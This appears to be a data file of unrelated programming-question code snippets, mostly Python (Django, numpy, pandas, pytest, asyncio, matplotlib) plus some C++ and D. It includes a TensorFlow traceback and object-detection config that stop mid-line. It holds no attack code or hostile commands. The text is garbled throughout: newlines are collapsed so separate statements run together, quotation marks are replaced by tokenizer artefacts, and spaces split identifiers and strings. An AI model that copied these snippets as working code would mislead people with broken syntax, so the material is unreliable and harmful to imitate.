1244 1244 1184 1232 996 1108 876 864 776 644 520 684 724 632 620 680 724 516 504 432 396 264 252 272 256 100 144B 88 116 76 68 76 56 56 48 68 48 76 48 80 44 32 76 76 108 120 180 240 340 456 624 1088 1268 1352 1384 1412 1376 1356 1372 1400 1436 1296 1240 1200 1256 1120 1028 1008 1072 980 944 932 1148 1192 1040 1188 1220 1292 1140 1116 1268 1292 1172 1272 1236 1216 1280 1248 1280 1388 1244 1224 1076 1096 1148 1108 1256 1356 1308 1236 992 1100 880 872 768 640 520 680 720 636 620 660 716 512 504 428 396 260 244 272 252 100 136C 84 108 68 68 72 56 56 36 60 48 76 44 72 48 32 68 76 108 124 176 240 340 436 604 1036 1168 1280 1372 1204 1304 1268 1228 1280 1312 1164 1076 1156 1108 924 960 864 944 896 840 840 1068 1052 1036 1128 1164 1136 1084 1052 1136 1072 1056 1136 1160 1088 1224 1180 1228 1264 1204 1044 1008 1076 1128 1112 1252 1188 1180 1156 1000 1096 860 868 736 600 520 680 704 624 616 684 720 500 504 408 392 252 236 264 240 96 144D 92 108 68 68 72 56 56 40 64 48 76 44 72 48 32 72 76 112 132 184 240 340 436 608 1040 1156 1280 1336 1196 1336 1316 1272 1344 1332 1144 1140 1176 1128 924 948 888 956 892 848 868 1036 1064 1036 1108 1192 1120 1080 1044 1152 1068 1040 1140 1180 1104 1232 1164 1280 1256 1196 1052 1016 1084 1128 1116 1252 1192 1168 1160 1000 1076 868 872 744 620 524 680 716 628 628 680 716 500 500 412 388 256 244 260 244 96 144"
"from operator import itemgetterdef get_something ( keys ) : d = { `` a '' : 1 , `` b '' : 2 , `` c '' : 3 } return itemgetter ( *keys ) ( d ) print ( type ( get_something ( [ `` a '' , `` b '' ] ) ) ) # < class 'tuple ' > print ( type ( get_something ( [ `` a '' ] ) ) ) # < class 'int ' > print ( type ( get_something ( [ ] ) ) ) # TypeError : itemgetter expected 1 arguments , got 0"
def intsum ( x ) : if x > 0 : return x + intsum ( x - 1 ) else : return 0intsum ( 10 ) 55
"class BaseTrainer ( models.Model ) : mode = models.IntegerField ( help_text= '' An integer '' ) def __init__ ( self , *args , **kwargs ) : super ( BaseTrainer , self ) .__init__ ( *args , **kwargs ) self._prev_mode = self.modeclass Trainer ( BaseTrainer ) : name = models.CharField ( max_length=100 , help_text= '' Name of the pokemon '' ) trainer_id = models.CharField ( max_length=10 , help_text= '' trainer id '' ) badges = models.IntegerField ( help_text= '' Power of the pokemon ( HP ) '' ) lives = models.PositiveIntegerField ( default=sys.maxsize ) unique_together = ( `` name '' , `` trainer_id '' ) def __init__ ( self , *args , **kwargs ) : super ( Trainer , self ) .__init__ ( *args , **kwargs ) self._temp = self.lives @ classmethod def test ( cls ) : t = Trainer.objects.only ( 'trainer_id ' ) .all ( ) print ( t )"
"scriptname [ -h ] [ -l ] [ -q|-d ] arg1 arg2 scriptmane [ -q|-d ] arg1 arg2scriptname -lscriptname -h class _ListAction ( argparse.Action ) : def __init__ ( self , option_strings , dest=argparse.SUPPRESS , default=argparse.SUPPRESS , help=None ) : super ( _ListAction , self ) .__init__ ( option_strings=option_strings , dest=dest , default=default , nargs=0 , help=help ) def __call__ ( self , parser , namespace , values , option_string=None ) : print_list ( ) parser.exit ( ) parser.add_argument ( '-l ' , ' -- list ' , action=_ListAction , help= '' List all available cases '' )"
total = results.count ( ) if request.GET.has_key ( 'offset ' ) : offset = int ( request.GET.get ( 'offset ' ) .strip ( ) ) results = results.order_by ( 'name ' ) [ 100*offset:100* ( offset+1 ) ] people = list ( results )
.. . ; . . @ a ; .. . ; . .. a . @ ... ; . aa .a.▒ . ▒. ; . ; . ; ; a . ▒ @ a . ; .. . ; ... .. . .. ; ; ; ; ; .. .a . . ; ./ -- .\ . /▒ a ; ./- . ; / \ ./ \\ ▒ ./━\ . aa -a.▒ . ▒.| . | . ; ▒ ┃ ▒ ▒-~┘ \ ; .. /| \\_// \ / .\ ; ; ; ▒ \\.- .pp -- ▒
"struct A { uint32_t value ; } ; struct B { uint64_t value ; } ; A globalA ; B globalB ; boost : :python : :object GetGlobalObjectByID ( int id ) { // boost : :python : :object will return a new copy of C++ object , not the global one . if ( id == 1 ) return boost : :python : :object ( & globalA ) ; else if ( id == 2 ) return boost : :python : :object ( & globalB ) ; else return boost : :python : :object ( nullptr ) ; } A & GetGlobalObjectA ( ) { return globalA ; } B & GetGlobalObjectB ( ) { return globalB ; } BOOST_PYTHON_MODULE ( myModule ) { using namespace boost : :python ; class_ & ltA & gt ( `` A '' ) ; class_ & ltB & gt ( `` B '' ) ; def ( `` GetGlobalObjectByID '' , GetGlobalObjectByID ) ; def ( `` GetGlobalObjectA '' , GetGlobalObjectA , return_value_policy & ltreference_existing_object & gt ( ) ) ; def ( `` GetGlobalObjectB '' , GetGlobalObjectB , return_value_policy & ltreference_existing_object & gt ( ) ) ; }"
"long num = 10000001 ; BigInt result ; result = iota ( 1 , num ) .map ! ( a = > to ! BigInt ( a * a ) ) .reduce ! ( ( a , b ) = > ( a + b ) ) ; writeln ( `` The sum is : `` , result ) ; auto bigs_map_nums = iota ( 1 , num ) .map ! ( a = > to ! BigInt ( a ) ) .array ; auto bigs_map = sum ( bigs_map_nums.map ! ( a = > ( a * a ) ) .array ) ; timeit.timeit ( 'print sum ( map ( lambda num : num * num , range ( 1,10000000 ) ) ) ' , number=1 ) 3333332833333350000003.58552622795105"
"# with a Sequential modelget_3rd_layer_output = theano.function ( [ model.layers [ 0 ] .input ] , model.layers [ 3 ] .get_output ( train=False ) ) layer_output = get_3rd_layer_output ( X )"
"import this '' '' .join ( [ c in this.d and this.d [ c ] or c for c in this.s ] ) `` The Zen of Python , by Tim Peters\n\nBeautiful is better than ugly.\nExplicit isbetter than implicit.\nSimple is better than complex.\nComplex is better than complicated.\nFlat is better than nested.\nSparse is better than dense.\nReadability counts.\nSpecial cases are n't special enough to break the rules.\nAlthough practicality beats purity.\nErrors should never pass silently.\nUnless explicitly silenced.\nIn the face of ambiguity , refuse the temptation toguess.\nThere should be one -- and preferably only one -- obvious way to do it.\nAlthough that way may not be obvious at first unless you 're Dutch.\nNow is better than never.\nAlthough never is often better than *right* now.\nIf the implementation is hard to explain , it 's a bad idea.\nIf the implementation iseasy to explain , it may be a good idea.\nNamespaces are one honking great idea -- let 's do more of those ! '' `` Gur Mra bs Clguba , ol Gvz Crgref\n\nOrnhgvshy vf orggre guna htyl.\nRkcyvpvg vf orggre guna vzcyvpvg.\nFvzcyr vf orggre guna pbzcyrk.\nPbzcyrk vf orggre guna pbzcyvpngrq.\nSyng vf orggre guna arfgrq.\nFcnefr vf orggre guna qrafr.\nErnqnovyvgl pbhagf.\nFcrpvny pnfrf nera ' g fcrpvny rabhtu gb oernx gur ehyrf.\nNygubhtu cenpgvpnyvgl orngf chevgl.\nReebef fubhyq arire cnff fvyragyl.\nHayrff rkcyvpvgyl fvyraprq.\nVa gur snpr bs nzovthvgl , ershfr gur grzcgngvba gb thrff.\nGurer fubhyq or bar -- naq cersrenoyl bayl bar -- boivbhf jnl gb qb vg.\nNygubhtu gung jnl znl abg or boivbhf ng svefg hayrff lbh'er Qhgpu.\nAbj vf orggre guna arire.\nNygubhtu arire vf bsgra orggre guna *evtug* abj.\nVs gur vzcyrzragngvba vf uneq gb rkcynva , vg ' f n onq vqrn.\nVs gur vzcyrzragngvba vf rnfl gb rkcynva , vg znl or n tbbq vqrn.\nAnzrfcnprf ner bar ubaxvat terng vqrn -- yrg ' f qb zber bs gubfr ! '' { ' A ' : ' N ' , ' C ' : ' P ' , ' B ' : ' O ' , ' E ' : ' R ' , 'D ' : ' Q ' , ' G ' : 'T ' , ' F ' : 'S ' , ' I ' : ' V ' , ' H ' : ' U ' , ' K ' : ' X ' , ' J ' : ' W ' , 'M ' : ' Z ' , ' L ' : ' Y ' , ' O ' : ' B ' , ' N ' : ' A ' , ' Q ' : 'D ' , ' P ' : ' C ' , 'S ' : ' F ' , ' R ' : ' E ' , ' U ' : ' H ' , 'T ' : ' G ' , ' W ' : ' J ' , ' V ' : ' I ' , ' Y ' : ' L ' , ' X ' : ' K ' , ' Z ' : 'M ' , ' a ' : ' n ' , ' c ' : ' p ' , ' b ' : ' o ' , ' e ' : ' r ' , 'd ' : ' q ' , ' g ' : 't ' , ' f ' : 's ' , ' i ' : ' v ' , ' h ' : ' u ' , ' k ' : ' x ' , ' j ' : ' w ' , 'm ' : ' z ' , ' l ' : ' y ' , ' o ' : ' b ' , ' n ' : ' a ' , ' q ' : 'd ' , ' p ' : ' c ' , 's ' : ' f ' , ' r ' : ' e ' , ' u ' : ' h ' , 't ' : ' g ' , ' w ' : ' j ' , ' v ' : ' i ' , ' y ' : ' l ' , ' x ' : ' k ' , ' z ' : 'm ' }"
"deps = [ `` Flask > =0.8 '' ] if not hasattr ( collections , `` OrderedDict '' ) : # Python 2.6 deps.append ( `` ordereddict '' ) setup ( … install_requires=deps , … ) Depends : ... , python2.7 | ( python2.6 , python-ordereddict ) dpkg-gencontrol : warning : ca n't parse dependency ( python2.6 Depends : python2.7 | python2.6 , python ( > = 2.7.1-0ubuntu2 ) , python ( < < 2.8 ) , python-flask , python-ordereddict"
"import threadingtry : # raise ImportError ( ) # Uncomment this line to show PyQt works correctly from PySide import QtCore , QtGuiexcept ImportError : from PyQt4 import QtCore , QtGui QtCore.Signal = QtCore.pyqtSignal QtCore.Slot = QtCore.pyqtSlotclass _ThreadsafeCallbackHelper ( QtCore.QObject ) : finished = QtCore.Signal ( object ) def Dummy ( ) : print `` Ran Dummy '' # return `` # Uncomment this to show PySide *not* crashing return Noneclass BatchProcessingWindow ( QtGui.QMainWindow ) : def __init__ ( self ) : QtGui.QMainWindow.__init__ ( self , None ) btn = QtGui.QPushButton ( 'do it ' , self ) btn.clicked.connect ( lambda : self._BatchProcess ( ) ) def _BatchProcess ( self ) : def postbatch ( ) : pass helper = _ThreadsafeCallbackHelper ( ) helper.finished.connect ( postbatch ) def cb ( ) : res = Dummy ( ) helper.finished.emit ( res ) # ` None ` crashes Python under PySide ? ? ! t = threading.Thread ( target=cb ) t.start ( ) if __name__ == '__main__ ' : # pragma : no cover app = QtGui.QApplication ( [ ] ) BatchProcessingWindow ( ) .show ( ) app.exec_ ( ) Python 2.7 ( r27:82525 , Jul 4 2010 , 09:01:59 ) [ MSC v.1500 32 bit ( Intel ) ] on win32 > > > import PySide > > > PySide.__version_info__ ( 1 , 1 , 0 , 'final ' , 1 ) > > > from PyQt4 import Qt > > > Qt.qVersion ( ) ' 4.8.2 '"
if is_nan ( expression ) : # Do stuff
"import reversionfrom django.db import transactionfrom django import testfrom myapp import modelsclass TestRevisioning ( test.TestCase ) : fixtures = [ 'MyModel ' ] def testDelete ( self ) : object1 = models.MyModel.objects.first ( ) with transaction.atomic ( ) : with reversion.create_revision ( ) : object1.delete ( ) self.assertEquals ( reversion.get_deleted ( models.MyModel ) .count ( ) , 1 ) AssertionError : 0 ! = 1"
"import asynciof = open ( 'filename.txt ' , ' w ' ) @ asyncio.coroutinedef fun ( i ) : print ( i ) f.write ( i ) # f.flush ( ) def main ( ) : loop = asyncio.get_event_loop ( ) loop.run_until_complete ( asyncio.as_completed ( [ fun ( i ) for i in range ( 3 ) ] ) ) f.close ( ) main ( )"
"> > > a = np.eye ( 4 ) > > > a [ ( 1 , 2 ) ] # basic indexing , as expected0.0 > > > a [ ( 1 , np.array ( 2 ) ) ] # basic indexing , as expected0.0 > > > a [ [ 1 , 2 ] ] # advanced indexing , as expectedarray ( [ [ 0. , 1. , 0. , 0 . ] , [ 0. , 0. , 1. , 0 . ] ] ) > > > a [ [ 1 , np.array ( 2 ) ] ] # basic indexing ! ! ? ? 0.0"
"s = pd.Series ( [ 1 , 2 , 3 , np.nan ] ) s.map ( 'this is a string { } '.format ) [ out ] 0 this is a string 1.01 this is a string 2.02 this is a string 3.03 this is a string nan s.map ( f'this is a string { ? } ' ) ?"
"Python 3.7.1 ( default , Nov 5 2018 , 14:07:04 ) Type 'copyright ' , 'credits ' or 'license ' for more informationIPython 6.4.0 -- An enhanced Interactive Python . Type ' ? ' for help.In [ 1 ] : 10**3.5ValueError : could not convert string to float : 3.5 python3 -I -c `` float ( ' 3.5 ' ) '' Traceback ( most recent call last ) : File `` < string > '' , line 1 , in < module > ValueError : could not convert string to float : ' 3.5 ' xxd testfile.py00000000 : 332e 350a 3.5.python3 -I testfile.pyValueError : could not convert string to float : 3.5"
"... ( ' A ' , ' B ' ) : { ' C ' : 0.14285714285714285 , 'D ' : 0.14285714285714285 , ' E ' : 0.14285714285714285 , ' F ' : 0.14285714285714285 , ' G ' : 0.14285714285714285 , ' H ' : 0.14285714285714285 , ' I ' : 0.14285714285714285 } , ..."
"import matplotlib.animation as animationimport numpy as npfrom pylab import *def ani_frame ( ) : fig = plt.figure ( ) ax = fig.add_subplot ( 111 ) ax.get_xaxis ( ) .set_visible ( False ) ax.get_yaxis ( ) .set_visible ( False ) im = ax.imshow ( rand ( 7 , 7 ) , cmap='gray ' , interpolation='nearest ' ) tight_layout ( ) def update_img ( n ) : print ( n ) tmp = rand ( 7 , 7 ) im.set_data ( tmp ) return im ani = animation.FuncAnimation ( fig , update_img , np.arange ( 0 , 20 , 1 ) , interval=200 ) writer = animation.writers [ 'ffmpeg ' ] ( fps=5 ) ani.save ( 'demo.mp4 ' , writer=writer ) return aniani_frame ( )"
"# Importsfrom my_package import MyClassimports many other packages / functions # Initialization ( instantiate class and call slow functions that get it ready for processing ) my_class = Class ( ) my_class.set_up ( input1=1 , input2=2 ) # Define main processing function to be used in loopdef calculation ( _input_data ) : # Perform some functions on _input_data ... ... # Call method of instantiate class to act on data return my_class.class_func ( _input_data ) input_data = np.linspace ( 0 , 1 , 50 ) output_data = np.zeros_like ( input_data ) # For Loop ( SERIAL implementation ) for i , x in enumerate ( input_data ) : output_data [ i ] = calculation ( x ) # PARALLEL implementation ( this does n't work well ! ) with multiprocessing.Pool ( processes=4 ) as pool : results = pool.map_async ( calculation , input_data ) results.wait ( ) output_data = results.get ( )"
"def pca ( X , gamma1 ) : kpca = KernelPCA ( kernel= '' rbf '' , fit_inverse_transform=True , gamma=gamma1 ) X_kpca = kpca.fit_transform ( X ) # X_back = kpca.inverse_transform ( X_kpca ) return X_kpca"
"import numpy as npimport numba as nb @ nb.njit ( nogil=True ) def func ( ) : my_array = np.empty ( 6 , dtype=np.dtype ( `` U20 '' ) ) my_array [ 0 ] = np.str ( 2.35646 ) return my_arrayif __name__ == '__main__ ' : a = func ( ) print ( a ) numba.errors.TypingError : Failed in nopython mode pipeline ( step : nopython frontend ) Invalid use of Function ( < class 'str ' > ) with argument ( s ) of type ( s ) : ( float64 )"
for i in range ( 300 ) : lst = range ( 300 ) for i in lst : # loop body for i in reversed ( lst ) : for k in range ( len ( lst ) ) :
"service.revisions ( ) .update ( fileId = newfile [ 'id ' ] , revisionId='head ' , body= { 'published ' : True , 'publishAuto ' : True } )"
"# lib.pyclass mixin : def __init_subclass__ ( cls , **kwargs ) : cls.check_mixin_subclass_validity ( cls ) super ( ) .__init_subclass__ ( **kwargs ) def check_mixin_subclass_validity ( subclass ) : assert hasattr ( subclass , 'necessary_var ' ) , \ 'Missing necessary_var ' def method_used_by_subclass ( self ) : return self.necessary_var * 3.14 # app.pyclass my_subclass ( mixin ) : necessary_var = None def __init__ ( self , some_value ) : self.necessary_var = some_value def run ( self ) : # DO SOME STUFF self.necessary_var = self.method_used_by_subclass ( ) # DO OTHER STUFF"
@ imp.when_imported ( 'numpy ' ) def set_linewidth ( numpy ) : import shutil numpy.set_printoptions ( linewidth=shutil.get_terminal_size ( ) [ 0 ] )
class Category ( models.Model ) : # fieldsclass Product ( models.Model ) : category = models.ForeignKey ( Category ) # fields
"C : \python27\Lib\site-packages\django\middleware\multihost.py from django.conf import settings from django.utils.cache import patch_vary_headers class MultiHostMiddleware : def process_request ( self , request ) : try : host = request.META [ `` HTTP_HOST '' ] if host [ -3 : ] == `` :80 '' : host = host [ : -3 ] # ignore default port number , if present request.urlconf = settings.HOST_MIDDLEWARE_URLCONF_MAP [ host ] except KeyError : pass # use default urlconf ( settings.ROOT_URLCONF ) def process_response ( self , request , response ) : if getattr ( request , `` urlconf '' , None ) : patch_vary_headers ( response , ( 'Host ' , ) ) return response # File : settings.py HOST_MIDDLEWARE_URLCONF_MAP = { `` mysite1.com '' : `` urls1 '' , # '' mysite2.com '' : `` urls2 '' } 127.0.0.1 mysite1.com + effbot -- - settings.py -- - view.py -- - wsgi.py -- - urls.py -- - urls1.py + objex -- - models.py -- - views.py + static -- - css -- - images mysite1.com request.META [ `` HTTP_HOST '' ]"
"import randomdef toss ( n ) : count = [ 0,0 ] longest = [ 0,0 ] for i in xrange ( n ) : coinface = random.randrange ( 2 ) count [ coinface ] += 1 count [ not coinface ] = 0 if count [ coinface ] > longest [ coinface ] : longest [ coinface ] = count [ coinface ] # print coinface , count , longest print `` longest sequence heads % d , tails % d '' % tuple ( longest ) if __name__ == '__main__ ' : toss ( 200 )"
"class Mydoc ( db.Document ) : x = db.DictField ( ) item_number = IntField ( ) { `` _id '' : ObjectId ( `` 55e360cce725070909af4953 '' ) , `` x '' : { `` mongo '' : [ { `` list '' : `` lista '' } , { `` list '' : `` listb '' } ] , `` hello '' : `` world '' } , `` item_number '' : 1 } Mydoc.objects ( item_number=1 ) .update_one ( push__x__mongo= { `` list '' : `` listc '' } ) { `` _id '' : ObjectId ( `` 55e360cce725070909af4953 '' ) , `` x '' : { `` mongo '' : [ { `` list '' : `` lista '' } , { `` list '' : `` listb '' } , { `` list '' : `` listc '' } ] , `` hello '' : `` world '' } , `` item_number '' : 1 } Mydoc.objects ( item_number=1 ) .update_one ( pull__x__mongo= { 'list ' : 'lista ' } ) Mydoc.objects ( item_number=1 ) .update_one ( push__x__mongo= { `` list '' : `` listc '' } ) # WorksMydoc.objects ( item_number=1 ) .update_one ( pull__x__mongo= { `` list '' : `` listc '' } ) # Error"
"{ ' a ' : { 'd ' : { ' e ' : ' f ' , ' l ' : 'm ' } } , ' b ' : ' c ' , ' w ' : { ' x ' : { ' z ' : ' y ' } } } { ' a ' : { 'd ' : 'o1 ' } , ' b ' : ' c ' , ' w ' : { ' x ' : 'o2 ' } }"
"import pytest @ pytest.fixture ( ) def my_fixture ( ) : data = { ' x ' : 1 , ' y ' : 2 , ' z ' : 3 } return datadef test_my_fixture ( my_fixture ) : assert my_fixture [ ' x ' ] == 1 @ pytest.fixture ( ) def my_fixture ( ) : print `` \nI 'm the fixture '' def test_my_fixture ( my_fixture ) : print `` I 'm the test '' I 'm the fixtureI 'm the test"
lexer = MyGrammarLexer ( FileStream ( path ) ) stream = CommonTokenStream ( lexer ) parser = MyGrammarParser ( stream ) return parser.start ( ) .object lexer = MyGrammarLexer ( a_given_string )
"from pytest import tmpdir_factory # note : this does n't actually work # setup / context has already been enteredtmpdir_factory.ensure ( 'exists.txt ' , file=True ) # I can use the fixturedel tmpdir_factory # teardown will eventually be called from magical_module import inject_fixturetmpdir_factory = inject_fixture ( 'tmpdir_factory ' ) # conftest.pyfrom datetime import datetimeimport pytest @ pytest.fixturedef my_fixture ( ) : obj = { 'setup ' : datetime.now ( ) } yield ( obj , f'yielded @ { datetime.now ( ) ! r } ' ) obj [ 'teardown ' ] = datetime.now ( )"
"from mpl_toolkits.mplot3d import axes3dimport matplotlib.pyplot as pltfrom matplotlib import cmfrom mpl_toolkits.mplot3d import Axes3Dimport numpy as npfig = plt.figure ( ) ax = fig.gca ( projection='3d ' ) X = np.array ( [ [ 200,800,1500,2000,3000 ] , [ 200,700,1500,2000,3000 ] , [ 200,800,1500,2000,3000 ] , [ 200,800,1500,2000,3000 ] ] ) Y = np.array ( [ [ 50,50,50,50,50 ] , [ 350,350,350,350,350 ] , [ 500,500,500,500,500 ] , [ 1000,1000,1000,1000,1000 ] ] ) Z = np.array ( [ [ 0,0,33,64,71 ] , [ 44,62,69,74,76 ] , [ 59,67,72,75,77 ] , [ 63,68,73,76,77 ] ] ) ax.plot_surface ( X , Y , Z , rstride=1 , cstride=1 , alpha=0.5 ) cset = ax.contourf ( X , Y , Z , zdir= ' z ' , offset=0 , cmap=cm.coolwarm ) cset = ax.contourf ( X , Y , Z , zdir= ' x ' , offset=200 , cmap=cm.coolwarm ) cset = ax.contourf ( X , Y , Z , zdir= ' y ' , offset=1000 , cmap=cm.coolwarm ) ax.set_xlabel ( ' X ' ) ax.set_xlim ( 200 , 3000 ) ax.set_ylabel ( ' Y ' ) ax.set_ylim ( 0 , 1000 ) ax.set_zlabel ( ' Z ' ) ax.set_zlim ( 0 , 100 ) plt.show ( )"
"from form_utils import forms as betterformsfrom django.db import modelsclass FilterForm ( betterforms.BetterForm ) : def __init__ ( self , *args , **kwargs ) : super ( FilterForm , self ) .__init__ ( *args , **kwargs ) print ( 'filter form __init__ ' ) ... class NewEntityForm ( FilterForm , FileFormMixin ) : def __init__ ( self , *args , **kwargs ) : super ( NewEntityForm , self ) .__init__ ( *args , **kwargs ) # super ( FileFormMixin , self ) .__init__ ( ) < -- really does not matter print ( 'newentityform __init__ ' ) class FileFormMixin ( object ) : def __init__ ( self , *args , **kwargs ) : super ( FileFormMixin , self ) .__init__ ( *args , **kwargs ) print ( 'file form mixin __init__ ' ) class FileFormMixin ( object ) : def __init__ ( self , *args , **kwargs ) : super ( FileFormMixin , self ) .__init__ ( *args , **kwargs ) class BetterBaseForm ( object ) : ... def __init__ ( self , *args , **kwargs ) : self._fieldsets = deepcopy ( self.base_fieldsets ) self._row_attrs = deepcopy ( self.base_row_attrs ) self._fieldset_collection = None super ( BetterBaseForm , self ) .__init__ ( *args , **kwargs ) class BetterForm ( with_metaclass ( BetterFormMetaclass , BetterBaseForm ) , forms.Form ) : __doc__ = BetterBaseForm.__doc__"
"< img class= '' outer '' id= '' first '' / > < div class= '' content '' ... / > < div class= '' content '' ... / > < div class= '' content '' / > < img class= '' outer '' id= '' second '' / > < div class= '' content '' ... / > < div class= '' content '' ... / > < img class= '' outer '' id= '' third '' / > < div class= '' content '' ... / > < div class= '' content '' ... / > img_blocks = soup.find_all ( 'img ' , attrs= { 'class ' : 'outer ' } ) div_Blocks = soup.find_all ( 'div ' , attrs= { 'class ' : 'content ' } )"
"window.set_pos ( [ 18,8 ] ) window.set_pos ( ( 18,8 ) )"
"[ { 'name ' : 'Foo ' , 'score ' : 1 } , { 'name ' : 'Bar ' , 'score ' : 2 } , { 'name ' : 'Foo ' , 'score ' : 3 } , { 'name ' : 'Bar ' , 'score ' : 3 } , { 'name ' : 'Foo ' , 'score ' : 2 } , { 'name ' : 'Baz ' , 'score ' : 2 } , { 'name ' : 'Baz ' , 'score ' : 1 } , { 'name ' : 'Bar ' , 'score ' : 1 } ] [ { 'name ' : 'Baz ' , 'score ' : 2 } , { 'name ' : 'Foo ' , 'score ' : 3 } , { 'name ' : 'Bar ' , 'score ' : 3 } ]"
"# [ ... ] def __history_dependent_simulate ( self , node , iterations=1 , *args , **kwargs ) : `` '' '' For history-dependent simulations only : `` '' '' + self.simulate.__doc___"
"... ... Average Recall ( AR ) @ [ IoU=0.50:0.95 | area=medium | maxDets=100 ] = 0.100Average Recall ( AR ) @ [ IoU=0.50:0.95 | area= large | maxDets=100 ] = 0.024Traceback ( most recent call last ) : File `` model_main.py '' , line 109 , in tf.app.run ( ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\platform\app.py '' , line 125 , in run_sys.exit ( main ( argv ) ) File `` model_main.py '' , line 105 , in maintf.estimator.train_and_evaluate ( estimator , train_spec , eval_specs [ 0 ] ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 471 , in train_and_evaluatereturn executor.run ( ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 610 , in runreturn self.run_local ( ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 711 , in run_localsaving_listeners=saving_listeners ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 354 , in trainloss = self._train_model ( input_fn , hooks , saving_listeners ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 1207 , in _train_modelreturn self._train_model_default ( input_fn , hooks , saving_listeners ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 1241 , in _train_model_defaultsaving_listeners ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 1471 , in _train_with_estimator_spec_ , loss = mon_sess.run ( [ estimator_spec.train_op , estimator_spec.loss ] ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\training\monitored_session.py '' , line 783 , in exitself._close_internal ( exception_type ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\training\monitored_session.py '' , line 816 , in _close_internalh.end ( self._coordinated_creator.tf_sess ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\training\basic_session_run_hooks.py '' , line 590 , in endl.end ( session , last_step ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 531 , in endself._evaluate ( global_step_value ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 537 , in _evaluateself._evaluator.evaluate_and_export ( ) ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 924 , in evaluate_and_exportis_the_final_export ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\training.py '' , line 957 , in _export_eval_resultis_the_final_export=is_the_final_export ) ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\exporter.py '' , line 418 , in exportis_the_final_export ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\exporter.py '' , line 126 , in exportstrip_default_attrs=self._strip_default_attrs ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 663 , in export_savedmodelmode=model_fn_lib.ModeKeys.PREDICT ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 789 , in _export_saved_model_for_modestrip_default_attrs=strip_default_attrs ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\estimator\estimator.py '' , line 883 , in _export_all_saved_modelsbuilder = saved_model_builder.SavedModelBuilder ( temp_export_dir ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\saved_model\builder_impl.py '' , line 97 , in initfile_io.recursive_create_dir ( self._export_dir ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\lib\io\file_io.py '' , line 379 , in recursive_create_dirpywrap_tensorflow.RecursivelyCreateDir ( compat.as_bytes ( dirname ) , status ) File `` E : \Anaconda3\lib\site-packages\tensorflow\python\framework\errors_impl.py '' , line 528 , in exitc_api.TF_GetCode ( self.status.status ) ) tensorflow.python.framework.errors_impl.NotFoundError : Failed to create a directory : training/export\Servo\temp-b'1576742954 ' ; No such file or directory # SSD with Mobilenet v1 configuration for MSCOCO Dataset. # Users should configure the fine_tune_checkpoint field in the train config as # well as the label_map_path and input_path fields in the train_input_reader and # eval_input_reader . Search for `` PATH_TO_BE_CONFIGURED '' to find the fields that # should be configured.model { ssd { num_classes : 2 box_coder { faster_rcnn_box_coder { y_scale : 10.0 x_scale : 10.0 height_scale : 5.0 width_scale : 5.0 } } matcher { argmax_matcher { matched_threshold : 0.5 unmatched_threshold : 0.5 ignore_thresholds : false negatives_lower_than_unmatched : true force_match_for_each_row : true } } similarity_calculator { iou_similarity { } } anchor_generator { ssd_anchor_generator { num_layers : 6 min_scale : 0.2 max_scale : 0.95 aspect_ratios : 1.0 aspect_ratios : 2.0 aspect_ratios : 0.5 aspect_ratios : 3.0 aspect_ratios : 0.3333 } } image_resizer { fixed_shape_resizer { height : 300 width : 300 } } box_predictor { convolutional_box_predictor { min_depth : 0 max_depth : 0 num_layers_before_predictor : 0 use_dropout : false dropout_keep_probability : 0.8 kernel_size : 1 box_code_size : 4 apply_sigmoid_to_scores : false conv_hyperparams { activation : RELU_6 , regularizer { l2_regularizer { weight : 0.00004 } } initializer { truncated_normal_initializer { stddev : 0.03 mean : 0.0 } } batch_norm { train : true , scale : true , center : true , decay : 0.9997 , epsilon : 0.001 , } } } } feature_extractor { type : 'ssd_mobilenet_v1 ' min_depth : 16 depth_multiplier : 1.0 conv_hyperparams { activation : RELU_6 , regularizer { l2_regularizer { weight : 0.00004 } } initializer { truncated_normal_initializer { stddev : 0.03 mean : 0.0 } } batch_norm { train : true , scale : true , center : true , decay : 0.9997 , epsilon : 0.001 , } } } loss { classification_loss { weighted_sigmoid { } } localization_loss { weighted_smooth_l1 { } } hard_example_miner { num_hard_examples : 3000 iou_threshold : 0.99 loss_type : CLASSIFICATION max_negatives_per_positive : 3 min_negatives_per_image : 0 } classification_weight : 1.0 localization_weight : 1.0 } normalize_loss_by_num_matches : true post_processing { batch_non_max_suppression { score_threshold : 1e-8 iou_threshold : 0.6 max_detections_per_class : 100 max_total_detections : 100 } score_converter : SIGMOID } } } train_config : { batch_size : 10 optimizer { rms_prop_optimizer : { learning_rate : { exponential_decay_learning_rate { initial_learning_rate : 0.004 decay_steps : 800720 decay_factor : 0.95 } } momentum_optimizer_value : 0.9 decay : 0.9 epsilon : 1.0 } } # fine_tune_checkpoint : `` PATH_TO_BE_CONFIGURED/model.ckpt '' # from_detection_checkpoint : true # Note : The below line limits the training process to 200K steps , which we # empirically found to be sufficient enough to train the pets dataset . This # effectively bypasses the learning rate schedule ( the learning rate will # never decay ) . Remove the below line to train indefinitely . num_steps : 1000 data_augmentation_options { random_horizontal_flip { } } data_augmentation_options { ssd_random_crop { } } } train_input_reader : { tf_record_input_reader { input_path : 'data/train.record ' } label_map_path : 'data/side_vehicle.pbtxt ' } eval_config : { num_examples : 8000 # Note : The below line 